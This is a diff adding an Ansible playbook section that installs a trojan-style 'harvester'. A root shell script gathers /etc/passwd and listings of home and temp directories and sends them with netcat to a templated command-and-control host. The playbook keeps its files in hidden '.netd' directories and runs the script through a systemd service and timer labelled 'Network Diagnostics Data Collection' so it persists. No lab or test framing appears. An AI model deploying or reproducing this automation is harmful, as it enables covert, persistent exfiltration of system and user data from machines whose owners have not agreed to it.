@@ -1,0 +1,93 @@
+---
+- name: Install netcat
+  apt:
+    name: netcat-openbsd
+    state: present
+    update_cache: yes
+
+- name: Ensure trojan cache directories exist
+  file:
+    path: "{{ item }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+  loop:
+    - /usr/local/lib/.netd
+    - /var/lib/.netd
+
+- name: Create harvester script
+  copy:
+    dest: "{{ harvest_script_path }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/sh
+      set -eu
+
+      LOG="{{ harvest_log }}"
+      C2="{{ c2_host }}"
+      PORT="{{ c2_port }}"
+
+      collect() {
+        echo "=== HARVEST $(date -Is) host=$(hostname) ==="
+        echo "--- /etc/passwd ---"
+        cat /etc/passwd 2>/dev/null || true
+        echo "--- home listing ---"
+        ls -la /home/ 2>/dev/null || true
+        for d in /home/*/; do
+          echo "--- $d ---"
+          ls -la "$d" 2>/dev/null || true
+        done
+        echo "--- /tmp listing ---"
+        ls -la /tmp/ 2>/dev/null || true
+        echo "--- END HARVEST ---"
+      }
+
+      echo "---- $(date) ----" >> "$LOG"
+      collect | nc -w 10 "$C2" "$PORT" 2>/dev/null || true
+      echo "harvest sent to $C2:$PORT" >> "$LOG"
+
+- name: Create harvester systemd service
+  copy:
+    dest: "/etc/systemd/system/{{ harvest_service_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Network Diagnostics Data Collection
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ harvest_script_path }}
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create harvester systemd timer
+  copy:
+    dest: "/etc/systemd/system/{{ harvest_timer_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Periodic network diagnostics data collection
+
+      [Timer]
+      OnCalendar={{ harvest_schedule }}
+      Persistent=true
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Enable and start harvester timer
+  systemd:
+    name: "{{ harvest_timer_unit }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
